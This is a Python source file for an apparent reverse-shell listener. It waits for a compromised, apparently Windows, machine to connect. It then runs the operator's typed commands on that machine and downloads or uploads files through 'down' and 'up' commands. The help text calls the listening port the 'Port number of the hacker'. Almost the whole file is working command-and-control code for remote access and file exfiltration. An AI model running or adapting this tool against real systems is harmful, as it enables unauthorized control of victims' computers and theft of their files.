import socket
import argparse
from termcolor import cprint, colored
import threading
import os

class Listener:
    CLIENTS = {}

    def __init__(self, port):
        self.sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sd.bind(('', port))
        self.sd.listen(10)
        #Waiting for requests
        self.client_sd, self.client_address = self.sd.accept()
        
        #Working dir on windows
        self.client_sd.send(b'cd\r\n')
        size = self.read_until_CRLF()
        self.working_dir = self.client_sd.recv(int(size)).decode('utf-8','ignore').replace('\n','')
        self.working_dir = self.working_dir.replace('\r','')

    def read_until_CRLF(self):
        size = ''
        
        while True:
            size += self.client_sd.recv(1).decode('utf-8','ignore')

            if size.endswith('\r\n'):
                break

        return size[:-2]

    def send_file(self, path):
        if os.path.exists(path) and os.path.isfile(path):
            with open(path, 'rb') as f:
                f_bytes = f.read()
                self.client_sd.send(f'{len(f_bytes)}\r\n'.encode()+f_bytes)
        else:
            print(f'File {path} not found')
            self.client_sd.send(b'0\r\n')

    def receive_file(self, size, name):
        file_bytes = self.client_sd.recv(size)
        
        with open(name, 'wb') as f:
            f.write(file_bytes)

    def run(self):
        while True:
            command = input(self.working_dir+'>> ')
            cmd_list = command.split(' ')
            self.client_sd.send((command+'\r\n').encode())

            if cmd_list[0]!='up':
                size = self.read_until_CRLF()

            if cmd_list[0]=='cd' and len(cmd_list)>1:
                self.working_dir = self.read_until_CRLF()
            
            elif cmd_list[0]=='down' and len(cmd_list)>1:
                if int(size) == 0:
                    print('No file download/found')
                else:
                    head, tail = os.path.split(cmd_list[1])
                    self.receive_file(int(size), tail)

            elif cmd_list[0]=='up' and len(cmd_list)>1:
                self.send_file(cmd_list[1])

            if cmd_list[0]!='down' and cmd_list[0]!='up':
                result = self.client_sd.recv(int(size)).decode('utf-8','ignore')
                print(result)

'''
Error raised if the user doesn't specify a valid gateway IP address
'''
class NoPortSpecified(Exception):
    pass

'''
Parser of command line arguments
'''
def args_parser():
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-port", "-p", dest="port", help="Port number of the hacker")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.port:
            raise NoPortSpecified
        
        cprint('Port:  ', 'green', attrs=['bold',], end='')
        print(f'{args.port}', end='\n\n')

    except NoPortSpecified as e :
        parser.print_help()
        exit(0)

    return int(args.port)


if __name__=='__main__':
    port = args_parser()
    server = Listener(port)
    server.run()
